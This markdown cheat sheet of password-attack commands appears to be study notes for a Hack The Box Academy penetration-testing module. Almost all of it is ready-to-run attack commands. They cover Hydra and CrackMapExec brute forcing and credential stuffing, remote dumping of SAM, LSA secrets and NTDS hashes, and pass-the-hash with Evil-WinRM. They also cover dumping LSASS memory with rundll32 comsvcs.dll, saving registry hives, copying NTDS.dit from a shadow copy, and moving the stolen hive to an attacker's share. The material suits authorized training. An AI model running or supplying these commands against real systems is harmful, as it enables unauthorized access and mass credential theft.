# Password attacks 

## Tools 

- [hashcat](../hashcat.md)
- [john-the-ripper](../john-the-ripper.md)
- [crackmapexec](../crackmapexec.md)
- [hydra](../hydra.md)

## Default credentials in services

https://github.com/ihebski/DefaultCreds-cheat-sheet


## Connecting to Target

```bash 
# CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!
```

```powershell 
# Uses Evil-WinRM to establish a Powershell session with a target. 
evil-winrm -i <ip> -u user -p password
```


```powershell 
# Uses SSH to connect to a target using a specified user.
ssh user@<ip>
```

```powershell 
# Uses smbclient to connect to an SMB share using a specified user.
smbclient -U user \\\\<ip>\\SHARENAME
```

```powershell 
# Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
```

## Password mutations

```bash 
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

```bash 
# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list
```

```bash title=""
# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. 
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

```bash title=""
# Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. 
curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt
```

## Remote Password Attacks

```bash title=""
# Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.
crackmapexec winrm <ip> -u user.list -p password.list
```

```bash title=""
# Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. 
crackmapexec smb <ip> -u "user" -p "password" --shares
```

```bash title=""
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>
```

```bash title=""
# Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.
hydra -l username -P password.list <service>://<ip>
```

```bash title=""
# Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.
hydra -L user.list -p password <service>://<ip>  
```

```bash title=""
# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>
```

```bash title=""
# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. 
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
```

```bash title=""
# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. 
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

```bash title=""
# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. 
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

```bash title=""
# Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.
evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>" 
```


## Windows Local Password Attacks

```bash title=""
# A command-line-based utility in Windows used to list running processes.
tasklist /svc                        
```

```powershell title=""
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

```powershell title=""
# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. 
Get-Process lsass
```

```powershell title=""
# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. 
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

```bash title=""
# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. 
pypykatz lsa minidump /path/to/lsassdumpfile
```

```powershell title=""
# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save
```

```powershell title=""
# Uses move in Windows to transfer a file to a specified file share over the network. 
move sam.save \\<ip>\NameofFileShare
```

```bash title=""
# Uses Secretsdump.py to dump password hashes from the SAM database.
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```powershell title=""
# Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. 
vssadmin CREATE SHADOW /For=C:
```

```powershell title=""
# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. 
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit 
```
